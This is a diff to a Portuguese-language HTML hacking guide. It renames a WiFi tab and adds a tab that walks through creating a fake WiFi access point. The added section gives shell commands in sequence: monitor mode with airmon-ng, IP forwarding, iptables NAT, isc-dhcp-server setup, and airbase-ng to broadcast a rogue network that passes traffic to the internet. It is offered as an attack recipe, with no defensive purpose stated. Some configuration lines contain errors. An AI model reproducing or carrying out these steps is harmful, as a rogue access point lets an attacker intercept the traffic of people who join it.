@@ -134,7 +134,8 @@
             <button class="tab-button" onclick="openTab(event, 'tab2')">PORT SCAN</button>
             <button class="tab-button" onclick="openTab(event, 'tab3')">ENUMERAÇÃO</button>
             <button class="tab-button" onclick="openTab(event, 'tab4')">BRUTE FORCE</button>
-            <button class="tab-button" onclick="openTab(event, 'tab5')">WIFI HACKING</button>
+            <button class="tab-button" onclick="openTab(event, 'tab5')">WIFI BRUTEFORCE</button>
+            <button class="tab-button" onclick="openTab(event, 'tab6')">Fake Acess point</button>
         </div>
 
         <div id="tab0" class="tab active">
@@ -267,6 +268,50 @@
             <p>apos executar este comando o brute force sera inciado, agora é so aguardar e pronto.</p>
             <p>obs: o "arquivo.cap" sera gerado apos vc escrever os dados no seu "arquivo.txt"</p>
         </div>
+
+        <div id="tab6" class="tab active">
+            <h2>[*] Criando um acess point falso (rede wifi falsa) [*]</h2>
+            <h3> airmon-ng start wlan0 </h3>
+            <li> iniciando a placa de rede em modo monitor </li>
+            <h3> echo 1 > /proc/sys/net/ipv4/ip_forward </h3>
+            <li> habilitando o encaminhamento de pacotes </li>
+            <h3> iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE </h3>
+            <li> o comando iptables mencionado configura o NAT para realizar
+                a masquerading (mascaramento) de pacotes IP na interface de rede "eth0" </li>
+            <h3> apt-get install isc-dhcp-server</h3>
+            <h3> cd /etc/default </h3>
+            <h3> nano isc-dhcp-server</h3>
+            <li> descomentar a linha "DHCPDv4_CONF..." e editar o final do arquivo onde tem escrito "INTERFACESv4 ""
+                adicionar o "at0" </li>
+            <h3> cd /etc/dhcp </h3>
+            <h3> nano dhcpd.conf </h3>
+            <li>descomentaras seguintes linhas: "subnet 10.254.239.32 netmask 255.255.255.224 {
+                range dynamic-bootp 10.254.239.40 10.254.239.60;
+                options broadcast-address 10.254.249.31;
+                option routers rtr-239-32-1.example.org;
+                }
+            </li>
+            <h3> grep -v "^#" dhcpd.conf | sed '/^$/d' > dhcp </h3>
+            <h3> nano dhcp </h3>
+            <li> editar deixando da seguinte forma: option domain-name-servers 8.8.8.8, 8.8.4.4;
+                defaults-lease-time 600;
+                max-lease-time 7200;
+                ddns-update-style none;
+                subnet 172.16.0.0 netmask 255.255.255.0 {
+                range dynamic-bootp 172.16.0.10 172.16.0.30;
+                options broadcast-address 172.16.0.1; </li>
+            <h3> rm dhcpd.conf </h3>
+            <h3> mv dhcp dhcpd.conf </h3>
+            <h3> airbase-ng wlan0mon -c 11 -e nome da rede </h3>
+            <li>comando utilizado para subir a rede wifi fake </li>
+            <h3> ifconfig at0 172.16.0.1/24 </h3>
+            <li>Atribuindo o ip para a interface at0 que foi criada ao startar o airbase </li>
+            <h3> service isc-dhcp-server start </h3>
+            <h3> ps aux | grep dhcp </h3>
+            <li> para conferir se estar rodando </li>
+            <h2> Pronto seu fake AP esta no ar e com acesso a internet </h2>
+        </div>
+
     </main>
 
     <footer>
